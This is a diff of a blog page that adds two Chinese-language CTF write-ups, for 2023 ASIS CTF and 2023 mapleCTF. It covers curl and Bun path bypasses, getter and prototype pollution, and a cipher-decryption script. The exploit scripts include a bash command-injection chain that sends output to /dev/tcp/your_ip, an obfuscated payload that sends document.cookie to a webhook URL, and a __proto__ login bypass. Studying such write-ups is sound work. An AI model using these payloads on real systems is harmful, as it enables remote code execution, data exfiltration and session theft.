@@ -150,7 +150,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">30</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -192,6 +192,232 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gudiffany.github.io/2023/10/04/17-46-05/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="diffany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diffany">
+      <meta itemprop="description" content="一个努力学习的菜鸟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | diffany">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/10/04/17-46-05/" class="post-title-link" itemprop="url">2023ASISCTF</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-10-04 17:46:05" itemprop="dateCreated datePublished" datetime="2023-10-04T17:46:05+08:00">2023-10-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-10-05 17:17:47" itemprop="dateModified" datetime="2023-10-05T17:17:47+08:00">2023-10-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/2023wp/" itemprop="url" rel="index"><span itemprop="name">2023wp</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2023/10/04/17-46-05/" class="post-meta-item leancloud_visitors" data-flag-title="2023ASISCTF" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="2023ASISCTF"><a href="#2023ASISCTF" class="headerlink" title="2023ASISCTF"></a>2023ASISCTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Flag is at /flag.txt</span></span><br><span class="line"><span class="comment">Hint for beginners: read curl&#x27;s manpage.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;file:///hi.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">	<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;x&#x27;</span>, <span class="variable">$_GET</span>) &amp;&amp;</span><br><span class="line">	!<span class="title function_ invoke__">str_contains</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]),<span class="string">&#x27;file&#x27;</span>) &amp;&amp; </span><br><span class="line">	!<span class="title function_ invoke__">str_contains</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]),<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">)&#123;</span><br><span class="line">	<span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>));</span><br></pre></td></tr></table></figure>
+<p>第一步</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">45.147</span><span class="number">.231</span><span class="number">.180</span>:<span class="number">8000</span>/?x=fi%fale:///ne%faxt.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;node:fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">I wonder what is inside /next.txt  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> secret = <span class="string">&#x27;39c8e9953fe8ea40ff1c59876e0e2f28&#x27;</span></span><br><span class="line"><span class="keyword">const</span> server = <span class="title class_">Bun</span>.<span class="title function_">serve</span>(&#123;</span><br><span class="line">  <span class="attr">port</span>: <span class="number">8000</span>,</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="params">req</span>) &#123;</span><br><span class="line">          <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>);</span><br><span class="line">          <span class="keyword">let</span> pname = url.<span class="property">pathname</span>;</span><br><span class="line">          <span class="keyword">if</span>(pname.<span class="title function_">startsWith</span>(<span class="string">`/<span class="subst">$&#123;secret&#125;</span>`</span>))&#123;</span><br><span class="line">      <span class="keyword">if</span>(pname.<span class="title function_">startsWith</span>(<span class="string">`/<span class="subst">$&#123;secret&#125;</span>/read`</span>))&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="keyword">let</span> fpath = url.<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">          <span class="keyword">if</span>(path.<span class="title function_">basename</span>(fpath).<span class="title function_">indexOf</span>(<span class="string">&#x27;next&#x27;</span>) == -<span class="number">1</span>)&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(fs.<span class="title function_">readFileSync</span>(fpath).<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;no way&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e)&#123; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;Couldn&#x27;t read your file :(&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">`did you know i can read files?? amazing right,,, maybe try /<span class="subst">$&#123;secret&#125;</span>/read/?file=/proc/self/cmdline`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>第二步</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.147.231.180:8001/39c8e9953fe8ea40ff1c59876e0e2f28/read/?file=/next.txt%00/.</span><br></pre></td></tr></table></figure>
+<p>ps:(bun 和 node 不同)</p>
+<h3 id="hello-again"><a href="#hello-again" class="headerlink" title="hello-again"></a>hello-again</h3><p>还是源码题目。</p>
+<p>首先根据源码</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/oven-sh/bun/blob/df9461ecc58e2882afa34cdf59d9887d9242b5f9/src/url.zig#L854">https://github.com/oven-sh/bun/blob/df9461ecc58e2882afa34cdf59d9887d9242b5f9/src/url.zig#L854</a></p>
+<p>url解码将会在<code>%PUBLIC_URL%</code>的地方停止，形成截断</p>
+<p>然后同时需要match得到private-symlink控制参数，然后使用index绕过(这步没完全看懂)</p>
+<p>似乎还是源码match解析的过程会将index解释成本目录下的东西，然而basename只会截取最后，两者解析的问题成功绕过</p>
+<p>最后通过软连接获取到bun的调试程序文件，然后tmp下面直接可以加载调用</p>
+<p>最后bash反带RCE</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/oven-sh/bun/blob/df9461ecc58e2882afa34cdf59d9887d9242b5f9/src/bun.js/api/server.zig#L5603">https://github.com/oven-sh/bun/blob/df9461ecc58e2882afa34cdf59d9887d9242b5f9/src/bun.js/api/server.zig#L5603</a></p>
+<p>还是需要找到源码，比较逆天的一题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8000</span>)</span><br><span class="line">p.send(<span class="string">b&quot;&quot;&quot;GET /cgi-bin/%PUBLIC_URL%/%70rivate-symlink/index?target=/bin/debconf&amp;path=/tmp/subl HTTP/1.1</span></span><br><span class="line"><span class="string">Host: dfdf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;\r\n&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8000</span>)</span><br><span class="line">a = <span class="string">&#x27;/readflag gimmeflag &gt; /dev/tcp/your_ip/10086&#x27;</span></span><br><span class="line">p.send(<span class="string">b&quot;&quot;&quot;GET /src:/app;echo$&#123;IFS&#125;&quot;&quot;&quot;</span>+base64.b64encode(a.encode())+<span class="string">b&quot;&quot;&quot;|base64$&#123;IFS&#125;-d|bash HTTP/1.1</span></span><br><span class="line"><span class="string">open-in-editor: 1</span></span><br><span class="line"><span class="string">Host: dfdf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;\r\n&#x27;</span>))</span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<h3 id="yet-another-calc"><a href="#yet-another-calc" class="headerlink" title="yet another calc"></a>yet another calc</h3><p>一种新的污染方式，实际上通过<code>__defineGetter__</code>以及<code>__lookupGetter__</code>这样的原生函数，将Math进行污染</p>
+<p>实际上简单来说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = 1</span><br><span class="line">Math.__defineGetter__(Math.qwewe, String.fromCharCode)</span><br><span class="line">Math.__defineGetter__(a, Math.__lookupGetter__)</span><br></pre></td></tr></table></figure>
+<p>Math.qwewe本身不存在必然是定义为<code>undefined</code>，但是String.fromCharCode跟其关联</p>
+<p>a存在，<code>__lookupGetter__</code>本身会寻找全部的原型链，然后查看是否存在某些属性，但是a同样不存在于Math，同时指向的是<code>undefined</code>(搜索上的先后)，所以调用的过程大概是这样的</p>
+<p><code>Math[a](70)</code>，调用<code>Math.__lookupGetter__</code>,然后搜索到<code>undefined</code>（除了null都存在），然后找到<code>Math.qwewe</code>，从而污染了Math</p>
+<p>并且寻找的<code>undefined</code>是最近的属性</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;sss&quot;</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(<span class="title class_">Math</span>.<span class="property">qwewe</span>, <span class="title class_">String</span>.<span class="property">fromCharCode</span>)</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(<span class="title class_">Math</span>.<span class="property">qwew</span>, <span class="title class_">String</span>.<span class="property">fromCodePoint</span>)</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(a, <span class="title class_">Math</span>.<span class="property">__lookupGetter__</span>)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Math</span>.<span class="property">sss</span></span><br><span class="line"><span class="comment">//ƒ fromCodePoint() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure>
+<p>所以这题思路非常奇妙啊</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title class_">Math</span>.<span class="property">constructor</span></span><br><span class="line">c=c.<span class="property">name</span></span><br><span class="line">c=c.<span class="property">constructor</span></span><br><span class="line">c=c.<span class="property">fromCharCode</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(<span class="title class_">Math</span>.<span class="property">aa</span>,c)</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(c.<span class="property">name</span>,<span class="title class_">Math</span>.<span class="property">__lookupGetter__</span>)</span><br><span class="line">v = <span class="title class_">Math</span>.<span class="title function_">fromCharCode</span>(<span class="number">102</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">40</span>, <span class="number">96</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">46</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">100</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">57</span>, <span class="number">51</span>, <span class="number">100</span>, <span class="number">45</span>, <span class="number">102</span>, <span class="number">49</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">52</span>, <span class="number">102</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">48</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">49</span>, <span class="number">63</span>, <span class="number">97</span>, <span class="number">61</span>, <span class="number">96</span>, <span class="number">43</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">41</span>)</span><br><span class="line">c=<span class="title class_">Math</span>.<span class="property">constructor</span></span><br><span class="line">c=c.<span class="property">constructor</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(<span class="title class_">Math</span>.<span class="property">aa</span>,c)</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(c.<span class="property">name</span>,<span class="title class_">Math</span>.<span class="property">__lookupGetter__</span>)</span><br><span class="line">z=<span class="title class_">Math</span>.<span class="title class_">Function</span>(v)</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">__defineGetter__</span>(c.<span class="property">name</span>,z)</span><br><span class="line"><span class="title class_">Math</span>.<span class="property">Function</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gudiffany.github.io/2023/10/02/17-31-22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="diffany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diffany">
+      <meta itemprop="description" content="一个努力学习的菜鸟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | diffany">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/10/02/17-31-22/" class="post-title-link" itemprop="url">2023mapleCTF</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-10-02 17:31:22" itemprop="dateCreated datePublished" datetime="2023-10-02T17:31:22+08:00">2023-10-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-10-05 17:31:36" itemprop="dateModified" datetime="2023-10-05T17:31:36+08:00">2023-10-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/2023wp/" itemprop="url" rel="index"><span itemprop="name">2023wp</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2023/10/02/17-31-22/" class="post-meta-item leancloud_visitors" data-flag-title="2023mapleCTF" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1>2023mapleCTF</h1>
+<h2 id="web">web</h2>
+<h3 id="BLADE-RUNNER">BLADE RUNNER</h3>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> k <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(k);</span><br><span class="line">    <span class="keyword">if</span> (k.<span class="title function_">toLowerCase</span>() == <span class="string">&quot;username&quot;</span> &amp;&amp; req.<span class="property">body</span>[k].<span class="title function_">toLowerCase</span>() == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;You can&#x27;t use that username.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    obj[k.<span class="title function_">toLowerCase</span>()] = req.<span class="property">body</span>[k];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">username</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">password</span>);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;h&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这题略显逆天，本地node调试和web路由得到的结果不同，会将原本传入的json解析成以下的结果</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="punctuation">[</span>&#x27;__proto__&#x27;<span class="punctuation">]</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> username<span class="punctuation">:</span> &#x27;admin&#x27; <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  password<span class="punctuation">:</span> &#x27;a&#x27;<span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>这就会绕过判断，但是实际上我本地调试的时候，因为直接建立的是一个对象了，所以事先完成了污染的过程，才会fuzz不过</p>
+<p>所以这题重点在于web传输过程和本地测试是不同的</p>
+<p>payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="crypto">crypto</h2>
+<h3 id="Pen-and-Paper">Pen and Paper</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ALPHABET = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_keystream</span>(<span class="params">key, length</span>):</span><br><span class="line">    keystream = []</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(keystream) &lt; length:</span><br><span class="line">        keystream.extend(key)</span><br><span class="line">        key = key[<span class="number">1</span>:] + key[:<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> keystream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    keystream = generate_keystream(key, <span class="built_in">len</span>(ciphertext))</span><br><span class="line">    decrypted = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        <span class="keyword">if</span> ciphertext[i] <span class="keyword">in</span> ALPHABET:</span><br><span class="line">            decrypted_char_index = (ALPHABET.index(ciphertext[i]) - keystream[i]) % <span class="number">26</span></span><br><span class="line">            decrypted_char = ALPHABET[decrypted_char_index]</span><br><span class="line">            decrypted.append(decrypted_char)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decrypted.append(ciphertext[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ciphertext.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext = f.read()</span><br><span class="line"></span><br><span class="line">key = [<span class="number">12</span>, <span class="number">21</span>, <span class="number">8</span>, <span class="number">19</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">25</span>, <span class="number">16</span>, <span class="number">12</span>] <span class="comment"># 慢慢调</span></span><br><span class="line"></span><br><span class="line">plaintext = decrypt(ciphertext, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Message:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(plaintext.lower())</span><br></pre></td></tr></table></figure>
+<h2 id="Re">Re</h2>
+<h3 id="JaVieScript">JaVieScript</h3>
